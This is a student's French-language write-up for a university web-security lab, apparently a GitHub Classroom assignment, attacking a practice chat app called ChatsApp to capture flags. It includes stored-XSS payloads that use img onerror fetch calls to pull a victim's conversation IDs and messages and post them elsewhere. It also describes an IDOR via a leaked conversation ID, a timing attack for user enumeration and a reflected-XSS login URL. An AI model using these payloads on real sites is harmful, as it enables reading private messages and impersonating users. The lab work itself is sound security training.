[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/1vxbBob6)
# 7 Security

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1

La partie 1 a été effectuée depuis alan.sottile1

### Flag 1

**Flag**: flag1:2b8fbc37a1a1aa01

**Exploit**: En premier lieu, j'ai recuperé l'id de la conversation entre Trump et Musk en envoyant ce message  à Musk:

```none
<img src="x" onerror="
let resultat;
fetch('/')
    .then(response => response.text())
    .then(text => {
        const splittedText = text.split(' ');

        const convIds = splittedText.filter(word => word.includes('openChat'));

        resultat += convIds;

        fetch(`/conversation/ab57da787d0b97cf`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message: resultat })
        })
        
    });
">
```
Ce message me permet d'envoyer un message depuis Musk avec les Id de ses conversations.

Grace à cela, j'ai pu récupérer l'id de leur conversation: b4c01034fdcc11d3

Ensuite, simplement changer l'url avec l'id de la conversation ne fonctionne pas car il faut être connecté en tant qu'utilisateur participant à la conversation.

J'ai cependant obtenu les messages de la conversation en envoyant cet input:

```
<img src=/ onerror="fetch('/conversation/b4c01034fdcc11d3')
    .then(response => response.text())
    .then(data => {
    
        const params = new URLSearchParams({ message: data });

        fetch('/conversation/ab57da787d0b97cf', {
            method: 'post',
            body: params
        });
    })
"/>
```
L'input permet de fetch le contenu de conversation/b4c01034fdcc11d3 (conv entre Musk et Trump) et ensuite de l'envoyer à ma conversation avec Musk.

### Flag 2

**Flag**: flag2:ba3c90be6c00bff2

**Exploit**: Même manière que pour le premier flag, comme les deux étaient dans la conversation.

### Flag 3

**Flag**: flag3:d54c2684bdc419dd

**Exploit**: Le flag 3 est obtenu d'une manière similaire aux 2 premiers.

J'ai envoyé un message à Musk afin qu'il envoit un message "gimme the rest of the codes pls" dans sa conversation avec trump:

```
<img src="x" onerror="
let resultat;
fetch('/')
    .then(response => response.text())
    .then(text => {
        resultat = 'gimme the rest of the codes pls';

        fetch(`/conversation/b4c01034fdcc11d3`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message: resultat })
        })
        
    });
">
```

Ensuite, j'ai lu le contenu de leur conversation avec le même code qu'aux points 1 et 2.


## Partie 2

La partie 2 a été effectuée depuis calvin.graf2

### Flag 4

**Flag**: flag4:529b16f1a36ecd30

**Exploit**:
On va réaliser une variable injecton en se renommant "nextTimeout". Une erreur va se faire avec la date et va donc déconnecter la personne à chaque fois


### Flag 5

**Flag**: flag5:8fc83c026f6847fc

**Exploit**: Envoyer message vide, puis inspecter, "Réponse", cliquer sur l'erreur puis dans "Réponse" on trouve le "conversationId" du receveur donc Elon Musk. On met cet id dans l'URL et on a accès à la conversation.

### Flag 6

Personnes inscrites à ChatsApp:
- `michelle.obama`
- `hillary.clinton`
- `george.w.bush`
- `sam.altman`

**Exploit**: On va réaliser une timing attack en essayant de se connecter sur les différents compte avec un mot de passe aléatoire. Si la personne n'a pas de compte, le serveur va mettre beaucoup moins de temps à répondre (~30ms) que si la personne en a un (~3000ms).

## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

http://185.143.102.102:8080/login?error=<script>alert(document.cookie);</script>

## Correction des vulnérabilités
Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

TODO